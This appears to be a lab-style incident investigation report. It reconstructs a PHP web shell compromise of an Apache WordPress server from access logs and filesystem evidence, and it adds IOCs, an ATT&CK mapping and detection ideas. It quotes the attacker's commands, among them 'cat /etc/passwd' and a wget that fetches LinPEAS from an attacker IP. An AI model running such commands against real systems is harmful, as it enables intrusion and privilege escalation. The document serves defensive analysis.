# Incident Investigation: PHP Web Shell Compromise on an Apache WordPress Server

## Executive Summary

The investigation reconstructed a web shell compromise against a Linux-hosted WordPress application by correlating Apache access logs with filesystem artifacts. Evidence showed an attacker progressing from reconnaissance and directory enumeration to successful upload of a PHP web shell, remote command execution, and preparation for privilege escalation through the download of LinPEAS. No evidence of successful privilege escalation was identified within the available evidence; however, the investigation confirmed that the attacker achieved remote command execution under the web server's security context.

---

# Incident Overview

# Investigation Scope

This investigation focused on reconstructing attacker activity using available host-based evidence. The primary sources examined were:

- Apache access logs (`/var/log/apache2/access.log`)
- Web server filesystem
- Uploaded PHP web shell

No endpoint detection, memory forensics, or network packet captures were available during this investigation.

## Incident Type

Web Shell Compromise

## Target Environment

- Operating System: Linux
- Web Server: Apache
- Web Application: WordPress
- Investigation Focus:
  - Apache Access Logs
  - Filesystem Artifacts
  - Uploaded PHP Web Shell

---

# Investigation Objective

Determine:

- Source of the malicious activity
- Initial access vector
- Evidence of web shell deployment
- Commands executed through the web shell
- Evidence of post-exploitation activity
- Indicators of Compromise (IOCs)

---

# Initial Indicators

Several indicators suggested malicious activity:

- Multiple HTTP 404 responses during directory enumeration
- Large number of requests from a single external IP
- Custom User-Agent during reconnaissance
- HTTP POST request to a file upload page
- Upload of a PHP file
- Repeated requests containing `cmd=` parameters
- Download of an external privilege escalation script

---

# Investigation Workflow

```
Reconnaissance
        │
        ▼
Directory Enumeration
        │
        ▼
Discovery of WordPress
        │
        ▼
Discovery of Upload Form
        │
        ▼
Web Shell Upload
        │
        ▼
Web Shell Verification
        │
        ▼
Remote Command Execution
        │
        ▼
System Enumeration
        │
        ▼
Privilege Escalation Preparation
```

---

# Investigation Process

## Phase 1 — Reconnaissance

Content Discovery & Directory Enumeration

### Objective

Determine whether reconnaissance activity occurred before exploitation.

### Evidence

Apache access logs showed repeated requests to numerous common directories.

Examples included:

- `/wp-admin`
- `/themes`
- `/config`
- `/uploads`
- `/admin`

Most requests returned:

```
404 Not Found
```

### Finding

The attacker was performing directory enumeration to locate accessible resources.

---

## Phase 2 — Discovery

Enumeration eventually identified a valid application:
This transition from reconnaissance to exploitation represents the point at which the attacker identified an application feature capable of accepting arbitrary file uploads.

```
GET /wordpress
200 OK
```

Further enumeration located:

```
/wordpress/wp-content/uploads/upload_form.php
```

The upload page returned a successful HTTP response.

### Assessment

The attacker identified a legitimate upload endpoint suitable for exploitation.

---

## Phase 3 — Web Shell Upload

A successful HTTP POST request uploaded a PHP web shell into the application's upload directory, establishing an initial foothold for remote command execution.

```
POST /wordpress/wp-content/uploads/upload_form.php?file=shadyshell.php
```

### Assessment

This request represents the successful deployment of a PHP web shell, establishing the conditions necessary for remote command execution.

---

## Phase 4 — Web Shell Validation

Immediately following the upload:

```
GET /wordpress/wp-content/uploads/shadyshell.php
```

### Assessment

The successful HTTP response confirms the uploaded PHP file was accessible and executable by the web server.

---

## Phase 5 — Remote Command Execution

The attacker executed several commands through the web shell.

Observed commands included:

```
whoami
id
uname -a
ls -la /home
cat /etc/passwd
```

Purpose of the observed commands:

| Command           | Purpose                                         |
| ----------------- | ----------------------------------------------- |
| `whoami`          | Identify the current execution context          |
| `id`              | Identify privileges                             |
| `uname -a`        | Collect operating system and kernel information |
| `ls -la /home`    | Enumerate filesystem                            |
| `cat /etc/passwd` | Enumerate users                                 |

### Assessment

These commands indicate post-exploitation reconnaissance.

The attacker was identifying:

- Current user
- Privileges
- Operating system
- Local users
- Filesystem contents

---

## Phase 6 — Privilege Escalation Preparation

LinPEAS is commonly used to identify local privilege escalation opportunities. Its download indicates the attacker had progressed beyond initial access and was preparing for privilege escalation or broader host compromise.

```
wget http://203.0.113.66:8000/linpeas.sh
```

### Assessment

The attacker attempted to download LinPEAS, a Linux privilege escalation enumeration script.

This suggests progression toward local privilege escalation.

---

# Filesystem Analysis

This investigative pivot was driven directly by evidence observed in the Apache access logs, illustrating how one artifact should naturally lead investigators toward the next source of evidence.

```bash
find /var/www -name "shadyshell.php"
```

Result:

```text
/var/www/html/wordpress/wp-content/uploads/shadyshell.php
```

The file was examined with:

```bash
cat /var/www/html/wordpress/wp-content/uploads/shadyshell.php
```

Analysis confirmed the presence of a functional PHP web shell and revealed the embedded investigation flag.

---

# Evidence Collected

## Key Artifacts

| Artifact                      | Description                                          |
| ----------------------------- | ---------------------------------------------------- |
| `/var/log/apache2/access.log` | Primary source used to reconstruct attacker activity |
| `shadyshell.php`              | Uploaded PHP web shell                               |
| `upload_form.php`             | Exploited upload endpoint                            |
| `linpeas.sh`                  | External privilege escalation enumeration script     |

## Apache Access Logs

Evidence of:

- Directory enumeration
- Upload endpoint discovery
- Web shell upload
- Remote command execution

## Filesystem

Recovered:

- Uploaded PHP web shell

## Commands Observed

```
whoami
id
uname -a
ls -la /home
cat /etc/passwd
wget http://203.0.113.66:8000/linpeas.sh
```

---

# Attack Timeline

| Time  | Activity                              |
| ----- | ------------------------------------- |
| 05:21 | Directory enumeration begins          |
| 05:21 | WordPress installation discovered     |
| 05:22 | Upload form identified                |
| 06:09 | PHP web shell uploaded                |
| 06:12 | Web shell validated                   |
| 06:14 | Initial command execution (`whoami`)  |
| 06:15 | System reconnaissance (`id`, `uname`) |
| 06:16 | Filesystem enumeration                |
| 06:18 | User enumeration                      |
| 06:20 | LinPEAS downloaded                    |

---

# Indicators of Compromise (IOCs)

## Source IP

```
203.0.113.66
```

## Malicious User-Agent

```
ashadyagent/1.1
curl/8.14.1
```

## Uploaded File

```
shadyshell.php
```

## Upload Endpoint

```
/wordpress/wp-content/uploads/upload_form.php
```

## Downloaded Tool

```
linpeas.sh
```

---

# MITRE ATT&CK Mapping

| Tactic               | Technique                                        |
| -------------------- | ------------------------------------------------ |
| Initial Access       | Exploit Public-Facing Application (T1190)        |
| Persistence          | Server Software Component: Web Shell (T1505.003) |
| Execution            | Command and Scripting Interpreter (T1059)        |
| Discovery            | System Owner/User Discovery (T1033)              |
| Discovery            | Account Discovery (T1087)                        |
| Discovery            | File and Directory Discovery (T1083)             |
| Discovery            | System Information Discovery (T1082)             |
| Privilege Escalation | Preparation activity observed (LinPEAS download) |

---

# Assessment

The investigation confirmed successful exploitation of a publicly accessible file upload feature, resulting in deployment of a PHP web shell.

Following successful execution, the attacker conducted host reconnaissance before attempting to prepare for privilege escalation by downloading LinPEAS.

No evidence of successful privilege escalation was observed within the available logs. However, the attempted download of LinPEAS strongly suggests the attacker intended to continue the intrusion beyond the privileges initially obtained through the web shell.

---

# Containment Recommendations

- Remove the uploaded web shell.
- Disable or secure vulnerable upload functionality.
- Restrict executable file uploads.
- Validate uploaded file types and content.
- Monitor web server directories for newly created executable files.
- Alert on suspicious query parameters such as `cmd=`.
- Monitor unusual HTTP POST requests to upload locations.
- Restrict outbound connections from web servers where appropriate.

---

# Detection Opportunities

Potential SIEM detections include:

- Multiple HTTP 404 responses followed by a successful upload request.
- PHP files created within upload directories.
- Requests containing `cmd=` parameters.
- Execution of system commands through web applications.
- Outbound HTTP requests initiated from the web server.
- Web server processes spawning shell utilities.
- Alert on web server processes initiating outbound network connections (e.g., wget or curl).
- Alert on web server processes executing shell interpreters (sh, bash, dash).

---

# Lessons Learned

This investigation reinforced the importance of correlating multiple evidence sources.

Apache access logs revealed **how** the attacker interacted with the application.

Filesystem analysis confirmed **what** was uploaded.

Together, these evidence sources reconstructed the complete attack chain from reconnaissance through post-exploitation activity.

No single source provided the complete picture; confidence in the investigation came from correlating independent evidence.

---

# Analytical Observations

Several aspects of the investigation are worth highlighting:

- The attack followed a structured progression from reconnaissance to exploitation rather than relying on automated exploitation alone.
- The Apache access log provided sufficient evidence to reconstruct attacker actions without requiring packet captures.
- Filesystem analysis validated the evidence observed in the logs by confirming the existence and contents of the uploaded web shell.
- The sequence of commands (`whoami` → `id` → `uname -a` → `cat /etc/passwd`) reflects a typical post-exploitation reconnaissance workflow.
- Downloading LinPEAS indicates preparation for privilege escalation but does not, by itself, confirm that privilege escalation was achieved.

# Investigation Conclusions

This investigation demonstrates that individual artifacts rarely tell the complete story. Web server logs revealed attacker interaction, filesystem analysis confirmed the uploaded payload, and together they produced a defensible reconstruction of the attack timeline. Effective incident response depends on correlating independent sources of evidence rather than relying on any single artifact.

Internet
│
▼
Directory Enumeration
│
▼
WordPress Discovery
│
▼
Upload Form Discovery
│
▼
PHP Web Shell Upload
│
▼
Remote Code Execution
│
▼
Host Enumeration
│
▼
Attempted Privilege Escalation Preparation
